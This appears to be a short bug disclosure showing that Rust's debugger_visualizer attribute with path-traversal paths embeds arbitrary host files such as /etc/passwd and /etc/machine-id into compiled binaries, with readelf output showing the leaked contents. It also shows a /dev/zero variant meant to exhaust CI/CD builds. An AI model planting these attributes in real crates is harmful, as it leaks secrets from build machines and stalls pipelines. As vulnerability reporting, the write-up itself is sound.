I discovver that via

```bash
relunsec@relunsec:~/softwaredev/rust-bugs$ cat exp2.rs
#![debugger_visualizer(gdb_script_file = "../../../../../../../../../etc/passwd")]
#![debugger_visualizer(gdb_script_file = "../../../../../../../../../etc/hosts")]
#![debugger_visualizer(gdb_script_file = "../../../../../../../../../../etc/machine-id")]


fn main() {}
relunsec@relunsec:~/softwaredev/rust-bugs$ rustc -g exp2.rs
relunsec@relunsec:~/softwaredev/rust-bugs$ readelf -p .debug_gdb_scripts ./exp2

String dump of section '.debug_gdb_scripts':
  [     1]  gdb_load_rust_pretty_printers.py
  [    23]  pretty-printer-exp2-0\n
            127.0.0.1 localhost\n
            # 127.0.1.1 relunsec\n
            # The following lines are desirable for IPv6 capable hosts\n
            ::1     ip6-localhost ip6-loopback\n
            fe00::0 ip6-localnet\n
            ff00::0 ip6-mcastprefix\n
            ff02::1 ip6-allnodes\n
            ff02::2 ip6-allrouters\n
  [   11c]  pretty-printer-exp2-1\n
            a8723b288a0e4074bfc716a439ee2711\n
  [   155]  pretty-printer-exp2-2\n
            [REDACTED CONTENT]
```
relunsec@relunsec:~/softwaredev/rust-bugs$ 

```

That feature can be leveraged/abused to bypass edrs and also the new emerging cargo sandbox, of using wasm idea

also can be used to drain ci cd

```rust
relunsec@relunsec:~/softwaredev/rust-bugs$ cat exp2.rs
#![debugger_visualizer(gdb_script_file = "../../../../../../../../../dev/zero")]


fn main() {}
```
And more, unlike the `include!` compile time functionallity, that one not a compiler time error, it is a full alternative to file read
